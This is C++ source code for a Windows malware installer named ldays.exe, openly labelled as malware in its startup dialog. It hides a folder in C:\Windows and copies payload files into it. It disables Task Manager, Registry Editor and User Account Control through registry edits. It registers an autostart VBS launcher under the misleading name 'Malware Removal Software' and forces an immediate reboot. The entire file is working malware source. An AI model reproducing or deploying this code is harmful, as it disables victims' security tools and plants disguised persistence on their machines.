#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <filesystem>
#include <Windows.h>
#include <direct.h>
#include <tchar.h>

namespace fs = std::filesystem;

void showConsole();
void DisableTaskMgrAndRegedit();
void DisableLUA();
void ProgramOnStartup();
void start(LPCSTR cmd);

INT
WINAPI
wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ PWSTR szCmdLine, _In_ INT nShowCmd)
{
	if ((MessageBox(NULL, L"YOU'RE ABOUT TO RUN A MALWARE! CONTINUE?", L"ldays.exe", MB_YESNO)) == IDNO)
	{
		exit(0);
	}

	if (!fs::exists("C:\\Windows\\ldays"))
	{
		_mkdir("C:\\Windows\\ldays");
	}

	wchar_t* fileLPCWSTR = (wchar_t*)L"C:\\Windows\\ldays";

	int attr = GetFileAttributes(fileLPCWSTR);
	if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0)
	{
		SetFileAttributes(fileLPCWSTR, attr | FILE_ATTRIBUTE_HIDDEN);
	}

	if (fs::exists("Malware"))
	{
		fs::path path = fs::absolute("Malware");
		fs::path fpath;
		fs::path fname;
		std::string dpath;

		for (const auto& entry : fs::directory_iterator(path))
		{
			fpath = entry.path();
			fname = fpath.filename();
			dpath = "C:\\Windows\\ldays\\" + fname.u8string();

			try
			{
				fs::copy_file(fpath, dpath);
			}
			catch (const std::exception&){}
		}
	}

	DisableTaskMgrAndRegedit();
	DisableLUA();
	ProgramOnStartup();

	start("C:\\Windows\\System32\\cmd.exe /c shutdown /f /r /t 0");

	return 0;
}

void showConsole()
{
	AllocConsole();
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);
}

void DisableTaskMgrAndRegedit()
{
	HKEY hKey = NULL;
	LPCWSTR kPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

	long sts = RegOpenKeyEx(HKEY_CURRENT_USER, kPath, 0, KEY_READ, &hKey);

	if ((ERROR_NO_MATCH == sts) || (ERROR_FILE_NOT_FOUND == sts))
	{ 
		long j = RegCreateKeyEx(HKEY_CURRENT_USER, kPath, 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
	}
	RegCloseKey(hKey);

	DWORD dwVal = 1;

	RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, L"DisableTaskMgr", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegSetValueEx(hKey, L"DisableRegistryTools", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegCloseKey(hKey);
}

void DisableLUA()
{
	HKEY hKey = NULL;
	LPCWSTR kPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

	long sts = RegOpenKeyEx(HKEY_LOCAL_MACHINE, kPath, 0, KEY_READ, &hKey);

	if ((ERROR_NO_MATCH == sts) || (ERROR_FILE_NOT_FOUND == sts))
	{
		long j = RegCreateKeyEx(HKEY_LOCAL_MACHINE, kPath, 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
	}
	RegCloseKey(hKey);

	DWORD dwVal = 0;

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, L"EnableLUA", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegCloseKey(hKey);
}

void ProgramOnStartup()
{
	HKEY hKey;
	LPCTSTR sk = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");

	LONG openRes = RegOpenKeyEx(HKEY_CURRENT_USER, sk, 0, KEY_ALL_ACCESS, &hKey);

	if (openRes == ERROR_SUCCESS)
	{
		std::cout << "Success opening key.\n";
	}
	else
	{
		std::cout << "Error opening key.\n";
	}

	LPCTSTR value = TEXT("Malware Removal Software");
	WCHAR path[80] = TEXT("\"C:\\Windows\\System32\\wscript.exe\" \"C:\\Windows\\ldays\\launcher.vbs\"");

	LONG setRes = RegSetValueEx(hKey, value, 0, REG_SZ, (LPBYTE)path, sizeof(path));

	if (setRes == ERROR_SUCCESS)
	{
		std::cout << "Success writing to Registry.\n";
	}
	else
	{
		std::cout << "Error writing to Registry.\n";
	}

	LONG closeOut = RegCloseKey(hKey);

	if (closeOut == ERROR_SUCCESS) {
		std::cout << "Success closing key.\n";
	}
	else
	{
		std::cout << "Error closing key.\n";
	}
}

void start(LPCSTR cmd)
{
	WinExec(cmd, SW_HIDE);
}